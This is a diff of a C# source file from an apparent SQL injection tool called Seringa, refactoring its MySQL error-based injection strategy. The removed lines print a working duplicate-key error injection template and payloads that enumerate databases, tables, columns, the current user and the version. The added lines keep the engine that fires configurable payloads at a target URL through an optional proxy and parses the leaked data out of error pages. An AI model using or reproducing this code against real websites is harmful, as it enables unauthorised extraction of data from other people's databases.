@@ -8,6 +8,7 @@ using Seringa.Engine.Utils;
 using Seringa.Engine.Exceptions;
 using Seringa.Engine.Utils.Extensions;
 using Seringa.Engine.DataObjects;
+using Seringa.Engine.Static;
 
 namespace Seringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
 {
@@ -24,45 +25,6 @@ namespace Seringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         #endregion Constructor
 
         #region Private
-        bool _ignoreLastCharacter = true;
-
-        #region Bounds
-        private const string _injectionResultLowerBound = "Integrity constraint violation: 1062 Duplicate entry '";
-        private const string _injectionResultUpperBound = "' for key 'group_key'";
-
-        private const string _injectionResultDebugLowerBound = "SQLSTATE";
-        private const string _injectionResultDebugUpperBound = "Stack trace:";
-        #endregion Bounds
-
-        #region Payloads
-        private const char _tail = '1';
-        private const string _exploit = " AND (SELECT 1 FROM (SELECT COUNT(*),"+ 
-                                                            "CONCAT(({0}), FLOOR(RAND(0)*2)) x "+
-                                                            "FROM information_schema.tables GROUP BY x) z)";
-        private const string _payloadGetUsername = "SELECT CURRENT_USER()";
-        private const string _payloadGetVersion = "SELECT @@version";
-        private const string _payloadGetSingleDatabaseName = "SELECT distinct table_schema FROM information_schema.TABLES limit {0},1";
-        //WHERE table_schema NOT IN ('mysql', 'performance_schema', 'information_schema')
-        private const string _payloadGetDatabasesCount = "select count(distinct table_schema) from information_schema.tables";
-        //WHERE table_schema NOT IN ('mysql', 'performance_schema', 'information_schema')
-        private const string _payloadCheckVulnerable = "select ‘victim’";
-        private const string _payloadGetCurrentDatabaseName = "SELECT database()";
-
-        private const string _payloadGetSingleTableNameFromDb = "SELECT table_name FROM information_schema.TABLES WHERE table_schema = '{0}' LIMIT {1},1";
-        private const string _payloadGetSingleTableName = "SELECT table_name FROM information_schema.TABLES LIMIT {0},1";
-
-        private const string _payloadGetTableCountFromDb = "SELECT count(table_name) FROM information_schema.TABLES where table_schema = '{0}'";
-        private const string _payloadGetTableCount = "SELECT count(table_name) FROM information_schema.TABLES";
-
-        private const string _payloadGetTableColumnCountFromDb = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '{0}' AND table_name = '{1}'";
-        private const string _payloadGetTableColumnCount = "SELECT count(column_name) FROM information_schema.columns WHERE table_name = '{0}'";
-
-        private const string _payloadGetSingleColumnNameFromDb = "SELECT column_name FROM information_schema.columns WHERE table_schema = '{0}' AND table_name = '{1}' LIMIT {2},1";
-        private const string _payloadGetSingleColumnName = "SELECT column_name FROM information_schema.columns WHERE table_name = '{0}' LIMIT {1},1";
-
-        private const string _payloadCustomQueryCount = "SELECT count(*) FROM ({0}) cq";
-
-        #endregion Payloads
 
         #region Methods
         private string GetAnswerFromHtml(string html,string query)
@@ -73,21 +35,21 @@ namespace Seringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
             {
                 try
                 {
-                    result = html.Substring(html.IndexOf(_injectionResultLowerBound) +
-                                                _injectionResultLowerBound.Length,
-                                                html.IndexOf(_injectionResultUpperBound) - html.IndexOf(_injectionResultLowerBound) -
-                                                _injectionResultLowerBound.Length);
+                    result = html.Substring(html.IndexOf(ExploitDetails.ResultStart) +
+                                                ExploitDetails.ResultStart.Length,
+                                                html.IndexOf(ExploitDetails.ResultEnd) - html.IndexOf(ExploitDetails.ResultStart) -
+                                                ExploitDetails.ResultStart.Length);
                 }
                 catch
                 {
                     string userFriendlyException = "Could not parse sql injection result.";
 
-                    if(html.IndexOf(_injectionResultDebugLowerBound) > -1 && html.IndexOf(_injectionResultDebugUpperBound) > -1)
-                        userFriendlyException = string.Format("Sql exception occured: {0}", 
-                                                    html.Substring(html.IndexOf(_injectionResultDebugLowerBound) +
-                                                    _injectionResultDebugLowerBound.Length,
-                                                    html.IndexOf(_injectionResultDebugUpperBound) - html.IndexOf(_injectionResultDebugLowerBound) -
-                                                    _injectionResultDebugLowerBound.Length));
+                    if (html.IndexOf(ExploitDetails.ErrorStart) > -1 && html.IndexOf(ExploitDetails.ErrorEnd) > -1)
+                        userFriendlyException = string.Format("Sql exception occured: {0}",
+                                                    html.Substring(html.IndexOf(ExploitDetails.ErrorStart) +
+                                                    ExploitDetails.ErrorStart.Length,
+                                                    html.IndexOf(ExploitDetails.ErrorEnd) - html.IndexOf(ExploitDetails.ErrorStart) -
+                                                    ExploitDetails.ErrorStart.Length));
 
                     if (DetailedExceptions)
                         userFriendlyException = string.Format("{0}({1})", userFriendlyException,query);
@@ -95,8 +57,9 @@ namespace Seringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
                     throw new SqlInjException(userFriendlyException);
                 }
             }
-            //TODO: cum bag eu asta in xml?!?
-            result = result.Remove(result.Length - 1, 1);
+            
+            if(ExploitDetails.TrimLast)
+                result = result.Remove(result.Length - 1, 1);
 
             return result;
         }
@@ -106,171 +69,54 @@ namespace Seringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
 
         #region Public
 
-        public bool IgnoreLastCharacter 
-        {
-            get
-            {
-                return _ignoreLastCharacter;
-            }
-            set
-            {
-                _ignoreLastCharacter = value;
-            }
-        }
-
         public bool DetailedExceptions { get; set; }
 
         public IQueryRunner QueryRunner { get; set; }
         public IProxyDetails ProxyDetails { get; set; }
-        public string DbVulnerableVersionFrom 
-        {
-            get
-            {
-                return "5.1.63";
-            }
-        }
-        public string DbVulnerableVersionTo 
-        {
-            get
-            {
-                return "5.1.64";
-            }
-        }
-
+        
         public bool UseProxy { get; set; }
 
         public string Url { get; set; }
 
-        public string DisplayName { get { return "Mysql error based method"; } }
+        public string DisplayName { get { return "Error based method"; } }
 
         public string SelectedDb { get; set; }
         public string SelectedTable { get; set; }
 
         public bool TestIfVulnerable()
         {
-            return !string.IsNullOrEmpty(GetDbVersion());
+            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, GeneralPayloads.ErrorBasedVictimIdentifier);
+            
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
+            var result = GetAnswerFromHtml(pageHtml,query);
+
+            return !string.IsNullOrEmpty(result) && result == GeneralPayloads.ErrorBasedVictimConfirmationResult;
         }
 
-        public string GetDbVersion()
-        {
-            string result = string.Empty;
-            string query = QueryHelper.CreateQuery(Url,_exploit,_payloadGetVersion);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy?ProxyDetails:null);
-            result = GetAnswerFromHtml(pageHtml,query);
-            return result;
-        }
-
-        public string GetDbUserName()
-        {
-            string result = string.Empty;
-            string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetUsername);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            result = GetAnswerFromHtml(pageHtml,query);
-            return result;
-        }
-        public string GetCurrentDbName()
-        {
-            string result = string.Empty;
-            string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetCurrentDatabaseName);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            result = GetAnswerFromHtml(pageHtml,query);
-            return result;
-        }
-
-        public int GetTotalNoOfDbs()
-        {
-            int count = 0;
-            string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetDatabasesCount);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            string countString = GetAnswerFromHtml(pageHtml,query);
-            int.TryParse(countString, out count);
-            return count;
-        }
-
-        public int GetTotalNoOfTables()
-        {
-            int count = 0;
-            string payload = string.Empty;
-            if (!string.IsNullOrEmpty(SelectedDb))
-                payload = string.Format(_payloadGetTableCountFromDb, SelectedDb);
-            else
-                payload = _payloadGetTableCount;
-            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            string countString = GetAnswerFromHtml(pageHtml,query);
-            int.TryParse(countString, out count);
-            return count;
-        }
-
-        public int GetTotalNoOfColumns()
-        {
-            /*
-            private const string _payloadGetTableColumnCount = "SELECT count(column_name) FROM information_schema.columns WHERE table_schema = '{0}' AND table_name = '{1}'";     
-            */
-            int count = 0;
-            string payload = string.Empty;
-            if (!string.IsNullOrEmpty(SelectedDb))
-                payload = string.Format(_payloadGetTableColumnCountFromDb, SelectedDb, SelectedTable);
-            else
-                payload = string.Format(_payloadGetTableColumnCount, SelectedTable);
-            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            string countString = GetAnswerFromHtml(pageHtml,query);
-            int.TryParse(countString, out count);
-            return count;
-        }
-
-        public string GetSingleDatabaseName(int startingFrom)
-        {
-            string result = string.Empty;
-            string query = QueryHelper.CreateQuery(Url, _exploit, string.Format(_payloadGetSingleDatabaseName, startingFrom.ToString()));
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            result = GetAnswerFromHtml(pageHtml,query);
-            return result;
-        }
-        public string GetSingleTableName(int startingFrom)
-        {
-            string result = string.Empty;
-            string payload = string.Empty;
-            if (!string.IsNullOrEmpty(SelectedDb))
-                payload = string.Format(_payloadGetSingleTableNameFromDb, SelectedDb, startingFrom);
-            else
-                payload = string.Format(_payloadGetSingleTableName, startingFrom);
-            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            result = GetAnswerFromHtml(pageHtml,query);
-            return result;
-        }
-        public string GetSingleTableColumnName(int startingFrom)
-        {
-            string result = string.Empty;
-            string payload = string.Empty;
-            if (!string.IsNullOrEmpty(SelectedDb))
-                payload = string.Format(_payloadGetSingleColumnNameFromDb, SelectedDb, SelectedTable, startingFrom);
-            else
-                payload = string.Format(_payloadGetSingleColumnName, SelectedTable, startingFrom);
-            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
-            result = GetAnswerFromHtml(pageHtml,query);
-            return result;
-        }
-
-        public string CustomQuery { get; set; }
 
         public int GetTotalNoOfCustomQueryResultRows()
         {
             int count = 0;
-            string payload = string.Empty;
+            string generatedpayload = string.Empty;
 
-            if(string.IsNullOrEmpty(CustomQuery))
+            if(PayloadDetails == null)
                 return 0;
 
-            if(CustomQuery.Contains("LIMIT",StringComparison.OrdinalIgnoreCase))
+            if(string.IsNullOrEmpty(PayloadDetails.Payload))
+                return 0;
+
+            if(PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Single)
                 return 1;
 
-            payload = string.Format(_payloadCustomQueryCount,CustomQuery);
+            generatedpayload = PayloadDetails.Payload;
 
-            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
+            if (PayloadDetails.Params.Count() > 0)
+                foreach(var param in PayloadDetails.Params)
+                    generatedpayload = generatedpayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));
+
+            generatedpayload = string.Format(GeneralPayloads.QueryResultCount,generatedpayload);
+
+            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedpayload);
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             string countString = GetAnswerFromHtml(pageHtml,query);
             int.TryParse(countString, out count);
@@ -281,22 +127,24 @@ namespace Seringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             string result = string.Empty;
 
-            string payload = string.Empty;
-            
-            if (!CustomQuery.Contains("LIMIT", StringComparison.OrdinalIgnoreCase))
+            string generatedPayload = PayloadDetails.Payload;
 
-                payload = string.Format("{0} LIMIT {1},1", CustomQuery, startingFrom);
+            if (PayloadDetails.Params.Count() > 0)
+                foreach (var param in PayloadDetails.Params)
+                    generatedPayload = generatedPayload.Replace("{" + param.Position + "}", PayloadHelpers.GetData(param.Name, this));
 
-            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            
+            if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
+                generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom);
+
+            string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, generatedPayload);
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml,query);
 
             return result;
         }
 
-        public ExploitDetails Exploit { get; set; }
-        public PayloadDetails Payload { get; set; }
+        public ExploitDetails ExploitDetails { get; set; }
+        public PayloadDetails PayloadDetails { get; set; }
 
         #endregion Public
     }
